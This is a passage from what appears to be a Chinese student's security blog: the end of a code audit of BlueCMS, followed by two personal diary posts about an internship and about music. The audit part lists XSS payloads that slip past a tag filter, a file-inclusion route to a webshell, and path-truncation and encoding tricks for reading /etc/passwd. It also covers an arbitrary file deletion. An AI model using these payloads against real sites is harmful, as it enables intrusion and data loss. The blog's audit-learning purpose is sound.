!empty($_POST[&#x27;descript&#x27;]) ? mb_substr($_POST[&#x27;descript&#x27;], 0, 90) : mb_substr(html2text($_POST[&#x27;content&#x27;]),0, 90);\n\n可以注意到，content 是没有被 htmlspecialchars 处理的，或许可以 xss\n跟进到 filter_data：\nfunction filter_data($str)&#123;\t$str = preg_replace(&quot;/&lt;(\\/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*&gt;/&quot;, &quot;&quot;, $str);\treturn $str;&#125;\n\n过滤了常用的xss标签，但仍存在其他的xss标签，如\n&lt;img src=1 onerror=alert(1)&gt;&lt;a href=javascript:alert(1)&gt;&lt;/a&gt;&lt;svg onload=alert(1)&gt;&lt;button onclick=alert(1)&gt;\n\n\n这样就是一个存储型 xss，只要点开这个新闻就会弹窗\n文件包含elseif ($act == &#x27;pay&#x27;)&#123;\tinclude &#x27;data/pay.cache.php&#x27;;\t$price = $_POST[&#x27;price&#x27;];\t$id = $_POST[&#x27;id&#x27;];\t$name = $_POST[&#x27;name&#x27;];\tif (empty($_POST[&#x27;pay&#x27;])) &#123;\t\tshowmsg(&#x27;对不起，您没有选择支付方式&#x27;);\t&#125;\tinclude &#x27;include/payment/&#x27;.$_POST[&#x27;pay&#x27;].&quot;/index.php&quot;;&#125;\n\n这里可能会有一个文件包含，可以配合上传点用图片马 getshell\n这里注意\tinclude ‘include&#x2F;payment&#x2F;‘.$_POST[‘pay’].”&#x2F;index.php”;在后面加了&#x2F;index.php，所以要想办法截断，php5.4 之前的版本可以直接 00 截断，5.4 之后的版本可以利用文件路径长度截断，如用字符.或者&#x2F;.或者.&#x2F;来截断。但是经过尝试后发现只有点截断可行\n复现没截图\n本地文件包含知识点号截断：?file=../../../../../../../../../boot.ini/………[…]…………(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256,y因为在windows下路径超过256个字符后的东西会被舍弃)%00截断:?file=../../../../../../../../../etc/passwd%00(php 版本&lt;= 5.3的才有。例如test.php%00.jpg，这时就会去掉%00后面的字符串。所以程序读取时候就变成了test.php)0x00截断:?file=../../../../../../../../../var/www/%00(需要 magic_quotes_gpc=off，unix 文件系统，比如 FreeBSD，OpenBSD，NetBSD，Solaris)路径长度截断:?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256利用操作系统对目录最大长度的限制，可以不需要 0 字节而达到截断的目的，在 window 下 256 字节、linux 下 4096 字节时会达到最大值，最大值长度之后的字符将被丢弃。而利用 &quot;./&quot; 的方式即可构造出超长目录字符串.)编码绕过:../ -》 %2e%2e%2f -》 ..%2f -》 %2e%2e/..\\ -》 %2e%2e%5c -》 ..%5c -》 %2e%2e(如果服务器对../ 等做一些过滤，可以用一些编码来进行绕过.注:必要情况下可以进行二次编码)\n\n任意文件删除在php中任意删除文件常用于unlink函数，这个函数是删除文件的，可能存在任意文件删除漏洞\nif (!empty($_POST[&#x27;face_pic1&#x27;]))&#123;       if (strpos($_POST[&#x27;face_pic1&#x27;], &#x27;http://&#x27;) != false &amp;&amp; strpos($_POST[&#x27;face_pic1&#x27;], &#x27;https://&#x27;) != false)&#123;          showmsg(&#x27;只支持本站相对路径地址&#x27;);        &#125;       else&#123;          $face_pic = trim($_POST[&#x27;face_pic1&#x27;]);       &#125;   &#125;else&#123;\tif(file_exists(BLUE_ROOT.$_POST[&#x27;face_pic3&#x27;]))&#123;\t\t@unlink(BLUE_ROOT.$_POST[&#x27;face_pic3&#x27;]);\t&#125;&#125;\n\n位置1：user.php-&gt;act&#x3D;edit_user_info ;我们判断处当变量act&#x3D;edit_user_info给user_id和face_pic3一个文件即可尝试是否删除（这里我们文件夹内以一个test.txt文件尝试）删除成功\nguest_book.php&lt;?php/** * [bluecms]版权所有 标准网络，保留所有权利 * This is not a freeware, use is subject to license terms * * $Id：guest_book.php * $author：lucks */define(&#x27;IN_BLUE&#x27;, true);require dirname(__FILE__) . &#x27;/include/common.inc.php&#x27;;$act = !empty($_REQUEST[&#x27;act&#x27;]) ? trim($_REQUEST[&#x27;act&#x27;]) : &#x27;list&#x27;;$ann_cat = $db-&gt;getall(&quot;SELECT * FROM &quot;.table(&#x27;ann_cat&#x27;).&quot; ORDER BY show_order, cid&quot;);if ($act == &#x27;list&#x27;)&#123;\t$guest_total = $db-&gt;getfirst(&quot;SELECT COUNT(*) FROM &quot;.table(&#x27;guest_book&#x27;).&quot; WHERE rid =0&quot;);\tinclude_once BLUE_ROOT.&#x27;include/page.class.php&#x27;;\t$perpage = &#x27;10&#x27;; \t$page = new page(array(&#x27;total&#x27;=&gt;$guest_total, &#x27;perpage&#x27;=&gt;$perpage)); \t$currenpage=$page-&gt;nowindex; \t$offset=($currenpage-1)*$perpage;\t$sql = &quot;SELECT a.*, b.user_name, c.add_time AS reply_time, c.content AS reply_content \t\t\tFROM (&quot; . table(&#x27;guest_book&#x27;).&quot; AS a \t\t\tLEFT JOIN &quot;.table(&#x27;user&#x27;).&quot; AS b \t\t\tON a.user_id = b.user_id) \t\t\tLEFT JOIN &quot; . table(&#x27;guest_book&#x27;).&quot; AS c \t\t\tON a.id = c.rid \t\t\tWHERE a.rid=0 \t\t\tORDER BY id DESC LIMIT $offset, $perpage&quot;;\t$guest_list = $db-&gt;getall($sql);\t\ttemplate_assign(\t\tarray(\t\t\t&#x27;current_act&#x27;,\t\t\t&#x27;cat_nav&#x27;, \t\t\t&#x27;add_nav_list&#x27;, \t\t\t&#x27;bot_nav&#x27;, \t\t\t&#x27;user_name&#x27;,\t\t\t&#x27;url&#x27;,\t\t\t&#x27;guest_list&#x27;,\t\t\t&#x27;guest_total&#x27;,\t\t\t&#x27;page&#x27;,\t\t\t&#x27;page_id&#x27;,\t\t\t&#x27;user_id&#x27;,\t\t\t&#x27;ann_cat&#x27;\t\t),\t\tarray(\t\t\t&#x27;留言列表&#x27;,\t\t\t$cat_nav,\t\t\t$add_nav_list, \t\t\t$bot_nav, \t\t\t$_SESSION[&#x27;user_name&#x27;],\t\t\tbase64_encode($url),\t\t\t$guest_list,\t\t\t$guest_total,\t\t\t$page-&gt;show(3),\t\t\t$currenpage,\t\t\t$_SESSION[&#x27;user_id&#x27;],\t\t\t$ann_cat\t\t)\t);\t$smarty-&gt;display(&#x27;guest_book.htm&#x27;);&#125;elseif ($act == &#x27;send&#x27;)&#123;\t$user_id = $_SESSION[&#x27;user_id&#x27;] ? $_SESSION[&#x27;user_id&#x27;] : 0;\t$rid = intval($_POST[&#x27;rid&#x27;]); \t$content = !empty($_POST[&#x27;content&#x27;]) ? htmlspecialchars($_POST[&#x27;content&#x27;]) : &#x27;&#x27;; \t$content = nl2br($content); \tif(empty($content)) \t&#123; \t\tshowmsg(&#x27;评论内容不能为空&#x27;); \t&#125;\t$sql = &quot;INSERT INTO &quot; . table(&#x27;guest_book&#x27;) . &quot; (id, rid, user_id, add_time, ip, content) \t\t\tVALUES (&#x27;&#x27;, &#x27;$rid&#x27;, &#x27;$user_id&#x27;, &#x27;$timestamp&#x27;, &#x27;$online_ip&#x27;, &#x27;$content&#x27;)&quot;;\t$db-&gt;query($sql);\tshowmsg(&#x27;恭喜您留言成功&#x27;, &#x27;guest_book.php?page_id=&#x27;.$_POST[&#x27;page_id&#x27;]);&#125;elseif ($act == &#x27;del&#x27;)&#123;\t$id = intval($_GET[&#x27;id&#x27;]);\tif (empty($id))\t&#123;\t\treturn false;\t&#125;\tif ($_SESSION[&#x27;user_id&#x27;] != 1) \t&#123;\t\tshowmsg(&#x27;您没有删除此留言的权限&#x27;);\t&#125;\t$db-&gt;query(&quot;DELETE FROM &quot; . table(&#x27;guest_book&#x27;) . &quot; WHERE id=&quot; . $id);\t$db-&gt;query(&quot;DELETE FROM &quot; . table(&#x27;guest_book&#x27;) . &quot; WHERE rid=&quot; . $id);&#125;?&gt;\n\n一个留言板的功能，实测并没有 xss 盲打\n这个简单来说就是这样了，我看网上文章应该还有一个 ssrf，但是我没测出来，还得再练啊┭┮﹏┭┮\n下一个 cms 审哪个呢，大家推荐一下\n","tags":["代码审计"]},{"title":"实习随想","url":"/2025/07/27/%E5%AE%9E%E4%B9%A0%E9%9A%8F%E6%83%B3/","content":"为期一个多月的实习也是终于要结束了，暑假的一半时间就这么用在了当牛马的日子了，结束之前还是先复盘一下总结一下收获吧\n首先也是感谢导师给我这么一个机会把我内推进来，本来这个假期是想去护网的，可惜没有去成，不过也是因祸得福有了这么一个实习的机会，虽说圈到的钱是天差地别，但是也没办法\n实习的地方在上海的360安全云（其实是外包），也是第一次来到大城市打拼，也遇到了很多麻烦，但是最终也是想办法解决了\n首先就是工作的内容，虽然来之前我就有了心理预期，又是外包又是实习生，双重 buff 的加持下肯定是没有机会去触碰到核心业务的，但是没想到工作内容这么牛马┭┮﹏┭┮\n工作的内容，说的高大上一点就是为客户提供云上的安全即服务，说的通俗一点就是和蓝初监测组一样，每天就是看看告警然后上报，最多再有个输出报告（ai输出），而且推推上也接入了ai辅助判断告警，可以说是需要点脑子，但是不多。\n但是这段实习总的来说收获还是有的，首先就是更深层次理解了态感的工作原理和部署原理，也了解到了360态感一体机和推推云服务的工作原理（过一两个月可能就忘光了），还有就是了解到了乙方厂商的安全服务的架构和基础建设。还有就是提高了我对流量的研判能力（说实话看流量是真的简单）\n虽然这个工作是纯牛马，还要倒班，但是该说不说，夜班还是非常清闲的，正适合去鼓捣点东西，这个月也是学了不少东西，或许比在学校的3个月加起来还多？在学校学东西的时间倒是真的不是很多，现在回想起来那几个月就打了点靶场，刷了点 CTF 题，倒是台球没少打，下个学期一定不能这么堕落了，必须要每天实验室报道了\n然后就是生活方面遇到的问题，这个问题倒不是很大，但是说实话，刚来上海那几天，这里的物价是真的震惊到我了，随随便便一碗阳春面，什么料都不加就能收8块钱，吃一顿正常的饭就要20起。后来在租房这里有一家江西小炒，以现炒菜的标准来说还是蛮实惠的，总的来说一天的伙食加通勤要50-60左右\n租房这方面，我是和一个学校的舍友一起来实习的，合租也是能省不少钱，因为我们是短租，而且还不是租一个月，是40天，所以几乎不可能去组民房，只能去找公寓（还是试着找了找中介什么的，价格简直阴的没边），但是也是运气好，给我们找到了一个公寓，十几平米上下床，完美符合我们的需求，40天房租加水电大约是2000多一点这样子，经济实惠，可惜不是民水民电。\n总的来说，这次实习的收益其实不是特别大，如果说想学习知识，暑假一个人静下心来学到的东西量是远超实习的，但是实习嘛，一般目的都是冲着对行业前景和行业架构的了解来的，虽说感触也不是很大，但是也是多多少少给我自己提供了一个前进的方向\n然后就是接下来从下个月到年底的计划，现在也只有一个模糊的方向，但是总之先列出来吧\n\n上手打一些偏向实战的靶场\n挖到起码1-2个 edusrc 证书站的证书\n深入一下 java 安全的漏洞（起码要全部复现一遍）\n好好学一下云安全，之前只是过了一遍基础知识，接下来要想办法融入实战了\n下学期的 CTF 要好好打一下，qwb，网鼎杯什么的\n\n明年绝对不干安服了，尽量冲一手实验室吧，实在不行就去干渗透\n","tags":["随笔"]},{"title":"日记","url":"/2025/07/20/%E6%97%A5%E8%AE%B0/","content":"之前发在CSDN了，但是感觉这种东西发在CSDN太尴尬了，还是删了发在我自己的blog里吧\n最近鼠鼠也是来到上海打拼（实习）了，那么秉持着来都来了的原则，鼠鼠也是去bw逛了逛，虽说没票只能在外场看看😭。可惜几乎没有多少我非常喜欢的ip，不由感慨现在的二次元圈已经变样了。\n虽说我知道内场有邦邦的展台，但是令人感慨的是居然没有多少邦邦的cos，但是偶遇了一位cos猫猫的老师整整三次，外场一次地铁站一次地铁上一次，可惜出于我的社恐还是没有敢上去集邮😭社恐的毛病到底什么时候能改口牙。\n最近看了不少圈内师傅的blog，但是比起技术博客，我发现我还是更爱看大佬们分享日常，也是不由得心生写个日常的想法，但是回头一看，全是流水账，典型的工科思维（bushi\n为什么要写博客呢，一开始是看了我们学校特别强的一个师傅toka✌🏻的博客。那时我还很年轻，里面的内容都看不懂，但是却让我心生和toka✌🏻一样写博客的想法。开始学网安后，尤其是今年不断深入，又看了不少师傅的博客，正如上文所说，最爱看的还是师傅们的日常的分享，也是不得不感慨师傅们除了技术牛，文笔也是一流，不是我这种只会流水账的小垃圾能比的。\n其实对文学类作品我一直不太感兴趣，看过最多的和文学相关的也就是轻小说了。个人来说，除去二次元的成分，我更喜欢音乐。各种音乐我都会听，但是主要听的还是摇滚和朋克。就算不去看歌词，我也能从编曲中感受到想要表达的情感。只可惜练习吉他1.5坤年，还是不能像吉他大手子一样，在琴弦的振动中加入自己想表达的感情，在加上空闲时间越来越少，于是练习吉他的时间也越来越少了。\n话说回来，我最喜欢的音乐风格果然还是日摇。或多或少受到日本acg的影响，但其实我最开始听日摇不是因为木柜子乐队。我第一个喜欢的日摇乐队（其实也是我最开始听乐队）就是One ok Rock，或许有人会说后期oor的风格偏向了欧美风格，但是我确确实实受到早期oor作品的鼓舞和影响并不断的keep going。\n后来的结束乐队和无刺有刺的曲子我也是全部非常喜欢，但是最喜欢的果然还是Mygo!!!!!\n因为我其实是今年年初才开始看mygo的，当时的我也是非常迷茫，我开始怀疑自己读一个双非计算机的意义，但是当我看到诗超绊，看到灯说的那句“即使迷茫也要不断前进”，听到mygo的曲子的时候，我真的受到了很大的鼓舞，我不断前进不断前进，终于在大一的暑假就当上了牛马找到了实习（虽然是苦逼安服仔）\n最近不知道为什么也是迷上了看room tour类型的视频，看着他们或大或小的户型，别具巧心的装修，我也是超前点播，已经在梦里想好了将来的家长什么样，可惜一抬头，看到的还是我十几平的小破房\n躺在十几平的出租屋，一眼望到头的人生我是绝对不要的，所以说即使迷茫也要不断前进，要把理想的房子变成现实，然后我也拍一期room tour\n","tags":["随笔"]}]